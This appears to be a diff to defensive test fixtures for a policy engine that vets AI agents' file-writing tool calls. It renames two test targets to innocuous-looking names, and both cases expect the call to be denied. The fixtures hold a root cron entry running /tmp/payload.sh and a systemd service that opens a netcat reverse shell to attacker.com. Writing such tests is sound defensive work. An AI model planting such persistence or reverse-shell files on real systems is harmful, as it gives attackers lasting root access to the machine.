@@ -55,7 +55,7 @@
   request:
     tool_name: "filesystem__write_file"
     arguments:
-      path: "/etc/cron.d/malicious"
+      path: "/etc/cron.d/logrotate"
       content: "* * * * * root /tmp/payload.sh"
   expectations:
     decision: deny
@@ -77,7 +77,7 @@
   request:
     tool_name: "filesystem__write_file"
     arguments:
-      path: "/etc/systemd/system/backdoor.service"
+      path: "/etc/systemd/system/app-monitor.service"
       content: "[Service]\nExecStart=/bin/bash -c 'nc -e /bin/sh attacker.com 4444'"
   expectations:
     decision: deny
